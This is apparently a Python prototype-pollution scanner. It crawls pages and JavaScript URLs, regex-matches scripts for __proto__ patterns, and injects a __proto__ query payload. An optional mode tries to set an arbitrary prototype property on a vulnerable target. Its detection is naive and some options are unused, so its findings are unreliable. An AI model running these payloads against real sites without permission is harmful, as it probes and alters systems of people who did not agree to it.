import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import random
import argparse
import sys

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
]

headers = {
    'User-Agent': user_agents[0]
}

default_patterns = [
    r'\.__proto__',
    r'\.constructor\.prototype',
]

def print_banner(version="0.012"):
    banner = f"""
\033[0;31m██████╗\033[0;91m  ██████╗ ██╗     ██╗     ██╗  ██╗
\033[0;31m██╔══██╗\033[0;91m██╔═══██╗██║     ██║     ╚██╗██╔╝
\033[0;31m██████╔╝\033[0;91m██║   ██║██║     ██║      ╚███╔╝ 
\033[0;31m██╔═══╝ \033[0;91m██║   ██║██║     ██║      ██╔██╗ 
\033[0;31m██║     \033[0;91m╚██████╔╝███████╗███████╗██╔╝ ██╗
\033[0;31m╚═╝     \033[0;91m ╚═════╝ ╚══════╝╚═╝  ╚═╝
\033[0m{version:>59}"""
    print(banner)

def load_patterns(pattern_file=None):
    if pattern_file:
        try:
            with open(pattern_file, 'r') as file:
                patterns = [line.strip() for line in file if line.strip() and not line.startswith('#')]
            return patterns
        except Exception as e:
            print(f"Error loading patterns from {pattern_file}: {e}")
            print("Using default patterns instead.")
    return default_patterns

def scan_prototype_pollution(url, patterns, method='GET', data=None, custom_headers=None, timeout=10, retries=3, property_name=None):
    session = requests.Session()
    session.headers.update(headers)
    
    if custom_headers:
        session.headers.update(custom_headers)
    
    for attempt in range(retries):
        try:
            if method == 'POST':
                response = session.post(url, data=data, timeout=timeout)
            else:
                response = session.get(url, timeout=timeout)

            if response.status_code == 200:
                print(f"Scanning {url} for prototype pollution vulnerabilities...")

                soup = BeautifulSoup(response.content, 'html.parser')
                scripts = soup.find_all('script')

                vuln_found = False

                for script in scripts:
                    if script.string:
                        for pattern in patterns:
                            if re.search(pattern, script.string):
                                print(f"\033[0;31mPotential prototype pollution found in script: {script.string[:100]}...\033[0m")
                                vuln_found = True

                payload = {
                    "__proto__": {
                        "polluted": "true"
                    }
                }
                test_url = url + '?' + urllib.parse.urlencode(payload)
                if method == 'POST':
                    test_response = session.post(test_url, data=data, timeout=timeout)
                else:
                    test_response = session.get(test_url, timeout=timeout)
                
                if "polluted" in test_response.text:
                    print(f"\033[0;32mVulnerability confirmed: {test_url}\033[0m")
                    vuln_found = True
                    if property_name:
                        print(f"Setting prototype property {property_name} to 'polluted'")
                        payload = {
                            "__proto__": {
                                property_name: "polluted"
                            }
                        }
                        test_url = url + '?' + urllib.parse.urlencode(payload)
                        if method == 'POST':
                            test_response = session.post(test_url, data=data, timeout=timeout)
                        else:
                            test_response = session.get(test_url, timeout=timeout)
                        print(f"Modified prototype property: {test_url}")
                if not vuln_found:
                    print(f"\033[0;31mNo vulnerabilities found in {url}\033[0m")
                break
        except requests.RequestException as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            if attempt == retries - 1:
                print(f"All {retries} attempts failed.")

def scan_js_file(file_path, patterns, method='GET', data=None, custom_headers=None, timeout=10, retries=3, property_name=None):
    with open(file_path, 'r') as file:
        urls = file.readlines()
        for url in urls:
            scan_prototype_pollution(url.strip(), patterns, method, data, custom_headers, timeout, retries, property_name)

def parse_args():
    parser = argparse.ArgumentParser(description="Prototype Pollution Vulnerability Scanner v0.012")
    parser.add_argument('-js', help="URL of the JavaScript file to scan", type=str)
    parser.add_argument('-u', help="URL to scan all JavaScript files", type=str)
    parser.add_argument('--random-agent', help="Select a random user-agent for the header", action='store_true')
    parser.add_argument('--user-agent', help="Select a specific user-agent for the header", type=str)
    parser.add_argument('-v', help="Display version", action='store_true')
    parser.add_argument('-jsL', help="File containing multiple JavaScript URLs to scan", type=str)
    parser.add_argument('-uL', help="File containing multiple URLs to scan for JavaScript files", type=str)
    parser.add_argument('-o', help="Output file for the results", type=str)
    parser.add_argument('-pr', help="Change object prototype property if a vulnerability is found", type=str)
    parser.add_argument('-p', '--patterns', help="File containing custom patterns to use for scanning", type=str)
    parser.add_argument('-m', '--method', help="HTTP method to use (GET or POST)", type=str, choices=['GET', 'POST'], default='GET')
    parser.add_argument('-d', '--data', help="Data to send with POST requests", type=str)
    parser.add_argument('-H', '--header', help="Custom headers to include in the request", type=str, action='append')
    parser.add_argument('-t', '--timeout', help="Request timeout in seconds", type=int, default=10)
    parser.add_argument('-r', '--retries', help="Number of retries for the request", type=int, default=3)
    return parser.parse_args()

def ensure_url_has_scheme(url):
    if not re.match(r'http[s]?://', url):
        return 'http://' + url
    return url

def main():
    args = parse_args()

    print_banner("v0.012")

    if args.v:
        sys.exit()

    if args.random_agent:
        headers['User-Agent'] = random.choice(user_agents)

    if args.user_agent:
        headers['User-Agent'] = args.user_agent

    custom_headers = {}
    if args.header:
        for header in args.header:
            key, value = header.split(':', 1)
            custom_headers[key.strip()] = value.strip()

    patterns = load_patterns(args.patterns)

    property_name = args.pr

    if args.js:
        scan_prototype_pollution(args.js, patterns, args.method, args.data, custom_headers, args.timeout, args.retries, property_name)

    if args.u:
        url = ensure_url_has_scheme(args.u)
        response = requests.get(url, headers=headers, timeout=args.timeout)
        soup = BeautifulSoup(response.content, 'html.parser')
        scripts = soup.find_all('script', src=True)
        for script in scripts:
            js_url = urllib.parse.urljoin(url, script['src'])
            scan_prototype_pollution(js_url, patterns, args.method, args.data, custom_headers, args.timeout, args.retries, property_name)

    if args.jsL:
        scan_js_file(args.jsL, patterns, args.method, args.data, custom_headers, args.timeout, args.retries, property_name)

    if args.uL:
        with open(args.uL, 'r') as file:
            urls = file.readlines()
            for url in urls:
                url = ensure_url_has_scheme(url.strip())
                response = requests.get(url, headers=headers, timeout=args.timeout)
                soup = BeautifulSoup(response.content, 'html.parser')
                scripts = soup.find_all('script', src=True)
                for script in scripts:
                    js_url = urllib.parse.urljoin(url, script['src'])
                    scan_prototype_pollution(js_url, patterns, args.method, args.data, custom_headers, args.timeout, args.retries, property_name)

if __name__ == '__main__':
    main()
